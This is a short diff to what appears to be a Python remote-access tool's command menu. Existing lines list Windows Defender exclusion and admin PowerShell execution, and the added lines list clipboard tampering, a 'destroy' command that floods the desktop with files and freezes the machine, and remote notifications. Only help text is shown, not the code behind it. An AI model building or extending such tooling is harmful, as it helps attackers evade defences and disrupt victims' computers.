@@ -76,6 +76,10 @@ while True:
                 print("exclusion: Windows Defender adds itself to exclusions (admin privilege required)")
                 print("admin_shell: Runs PowerShell code as admin (admin privilege required)")
                 print("clipboard: Show the contents of the clipboard")
+                print("clipboard_delete: Delete the content of the clipboard")
+                print("clipboard_rename : Rename the content of the clipboard")
+                print("destroy: It constantly creates .txt on the desktop and in its directory. It also causes freezing.")
+                print("notification: Sends a notification with the title and text you specify (notification title, message)")
 
         client_socket.close()
     except Exception as e:
